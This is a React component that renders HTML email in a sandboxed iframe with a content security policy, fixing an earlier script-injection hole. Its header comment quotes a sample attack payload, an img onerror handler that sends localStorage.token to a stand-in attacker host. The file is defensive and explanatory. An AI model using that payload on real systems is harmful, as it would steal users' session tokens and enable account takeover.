'use client';

import { useMemo } from 'react';

interface MessageBodyProps {
  bodyHtml: string | null;
  bodyText: string | null;
}

/**
 * Renders an email body.
 *
 * HTML email is arbitrary markup written by whoever sent the message. It was
 * previously injected with `dangerouslySetInnerHTML`, which runs it inside this
 * application's origin -- so a message containing
 * `<img src=x onerror="fetch('//attacker/'+localStorage.token)">` would exfiltrate
 * the reader's session token the moment they opened the email. Anyone who knew
 * a user's address could take over their account.
 *
 * The body now renders inside a sandboxed iframe. With no `allow-scripts` and
 * no `allow-same-origin` in the sandbox attribute, the browser refuses to run
 * script in it at all and gives it an opaque origin, so even if script did run
 * it could not reach this page's DOM, cookies or localStorage. That is a
 * browser-enforced boundary rather than a filter that has to keep pace with new
 * bypasses.
 */
export function MessageBody({ bodyHtml, bodyText }: MessageBodyProps) {
  const srcDoc = useMemo(() => {
    if (!bodyHtml) return null;
    // A CSP inside the frame as defence in depth: block remote script outright,
    // and stop remote images silently reporting that the mail was opened.
    return [
      '<!doctype html><html><head><meta charset="utf-8">',
      `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:;">`,
      '<base target="_blank">',
      '<style>',
      'html,body{margin:0;padding:0;font:14px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:#374151;word-wrap:break-word;overflow-wrap:break-word;}',
      'img,table{max-width:100%;}',
      'a{color:#2563eb;}',
      '</style></head><body>',
      bodyHtml,
      '</body></html>',
    ].join('');
  }, [bodyHtml]);

  if (srcDoc) {
    return (
      <iframe
        // No allow-scripts and no allow-same-origin. Removing either of those
        // re-opens the account-takeover path described above.
        sandbox="allow-popups allow-popups-to-escape-sandbox"
        srcDoc={srcDoc}
        title="Message content"
        loading="lazy"
        referrerPolicy="no-referrer"
        className="w-full min-h-[8rem] h-[28rem] border-0 bg-white"
      />
    );
  }

  if (bodyText) {
    return (
      <pre className="whitespace-pre-wrap font-sans text-gray-700 text-sm">{bodyText}</pre>
    );
  }

  return <p className="text-gray-400 italic">No content</p>;
}
